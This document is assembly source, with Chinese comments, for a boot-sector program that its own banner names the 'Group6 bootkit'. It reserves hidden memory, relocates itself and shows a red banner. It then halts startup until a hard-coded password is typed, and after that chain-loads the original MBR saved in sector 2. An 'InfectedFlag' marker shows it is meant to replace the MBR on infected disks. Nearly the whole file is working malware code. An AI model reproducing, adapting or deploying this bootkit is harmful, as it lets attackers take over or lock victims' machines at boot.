;Compile: nasm -f bin MBR.asm -o MBR.img
CPU 486
BITS 16													;16位实模式
@Initial:
		xor		bx, bx
		mov 	ds, bx
		mov 	ax, [0x413]								;0x413是BIOS的内存记录区
														;记录的是内存大小,单位是KB
														;使用此内存类似栈,从高向低分配
		dec		ax
		dec		ax										;(ax-2),分配2KB的空间
		mov 	[0x413], ax								
														
														
														
														
		shl 		ax, 0x6								;10-4右移						
														;寻址方式为(段地址:偏移)
														;计算为(段地址*0x10 + 偏移)
		mov 	es, ax									
		mov 	si, 0x7c00								
		xor 		di, di								
		mov 	cx, 0x100								
		rep 		movsw								;复制自身到刚刚分配的内存
														
		
		push 	es										
		push 	word @Main								
		retf											;远返回,返回到es:@Main,就是返回到分配内存中的镜像里的@Main里执行
														

;
@Main:
		call		@DisplayMessage						
		call		@GetReturn							
		call		@BootOS								
;

;
@DisplayMessage:
		mov		bp, TitleMessage
		mov     cx, 0x10c								;cx存放TitleMessage的长度
		mov		ax, 0x1301								;ah:0x13表示13号子功能
														;al:0x1表示显示方式
		mov		bx, 0x000c								;bh:0x0表示当前页
														;bl:0xc表示字符属性(红字)
		xor		dx, dx									;dh表示行坐标,dl表示列坐标
		int		10h										;0x10号中断,显示服务
		ret
;

;
@readbyte:
		mov		ah, 0									;ah:0x0表示0号子功能,读键盘
		int		16h										;0x16号中断,键盘服务
		and		ax, 0xff								;取低八位，ah为键盘扫描码,al为ASCII码
		ret
		
@GetReturn:
		call 	@readbyte
		cmp		al, 0x78								;不是则继续读取
		jnz		@GetReturn
		call 	@readbyte
		cmp		al, 0x64
		jnz		@GetReturn
		call 	@readbyte
		cmp		al, 0x65
		jnz		@GetReturn
		call 	@readbyte
		cmp		al, 0x66
		jnz		@GetReturn		
		call 	@readbyte
		cmp		al, 0x30								
		jnz		@GetReturn								
		call 	@readbyte
		cmp		al, 0x38
		jnz		@GetReturn
		call 	@readbyte
		cmp		al, 0x31
		jnz		@GetReturn
		call 	@readbyte
		cmp		al, 0x37
		jnz		@GetReturn
		
		ret
;

;
@BootOS:
		mov		es, dx									
		mov		ax, 0x201								;ah:0x2表示2号子功能
														;al:0x1表示读取的扇区数为1
		mov		cx, 0x2									;ch:0x0表示柱面为0
														;cl:0x1表示读取的扇区是2
														;第2扇区保存的是原来的MBR
		mov		dx, 0x80								;DL:0x80表示读取的是硬盘
		mov		bx, 0x7c00								;es:bx(0000:7c00)为缓冲区地址
		int		13h										;0x13号中断,直接磁盘服务
		
		jmp		0x0:0x7c00								;跳回原来正常的MBR执行启动
;

;
InfectedFlag	db "0817"								;MBR的感染标示
TitleMessage	db "+-----------------------------------------+", 0xa, 0xd,
				db "|              Group6 bootkit             |", 0xa, 0xd,
				db "|           Haus & ii & wanrenmi          |", 0xa, 0xd,
				db "|          http://www.xdef.org.cn         |", 0xa, 0xd,
				db "+-----------------------------------------+", 0xa, 0xd,
				db "[-]          Enter the password            "

;

;
times 510-($-$$)  db 0									
BootSignature		dw  0AA55h							

;



